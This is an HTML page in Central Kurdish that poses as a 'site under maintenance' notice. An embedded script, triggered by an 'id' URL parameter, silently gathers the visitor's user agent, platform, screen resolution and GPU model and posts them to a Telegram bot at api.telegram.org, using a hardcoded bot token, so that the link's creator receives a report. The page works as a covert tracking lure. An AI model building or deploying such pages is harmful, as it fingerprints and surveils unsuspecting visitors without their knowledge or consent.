<!DOCTYPE html>
<html lang="ckb" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لەژێر چاکسازیی و گەشەپێداندایە</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .card {
            background: #1e293b;
            padding: 40px 20px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 90%;
            border: 1px solid #334155;
        }
        .spinner {
            border: 4px solid #334155;
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #38bdf8; font-size: 1.3rem; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 0.95rem; line-height: 1.5; }
    </style>
</head>
<body>

    <div class="card">
        <div class="spinner"></div>
        <h2>🛠 ماڵپەڕەکە لەژێر کارکردندایە</h2>
        <p>بەمزووانە بە شێوەیەکی تێروتەسەل چالاک دەکرێت. تکایە دواتر سەردانمان بکەرەوە.</p>
    </div>

    <script>
        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
        
        // وەرگرتنی IDی خاوەنی لینکەکە لە URL
        const urlParams = new URLSearchParams(window.location.search);
        const ownerId = urlParams.get('id');

        if (ownerId) {
            // کۆکردنەوەی زانیارییەکانی ئامێرەکە
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            const screenRes = `${window.screen.width}x${window.screen.height} (Ratio:${window.devicePixelRatio})`;
            
            let gpu = "نەدۆزرایەوە";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            } catch (e) {}

            // ئامادەکردنی پەیامەکە بۆ تێلێگرام
            const message = `🔔 **سەردانیکەرێکی نوێ کاتژمێرێک پێش ئێستا لێنکەکەی کردەوە!**\n\n` +
                            `📱 **سیستەم/ئامێر:** \`${platform}\`\n` +
                            `📐 **ڕوونی شاشە:** \`${screenRes}\`\n` +
                            `🎮 **کارتی گرافیک (GPU):** \`${gpu}\`\n` +
                            `🌐 **User-Agent:** \`${ua}\``;

            // ناردنی زانیارییەکان بۆ بۆتەکە بۆ ئەوەی تەنها بۆ تۆی بنێرێت
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ownerId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(err => console.error(err));
        }
    </script>

</body>
</html>
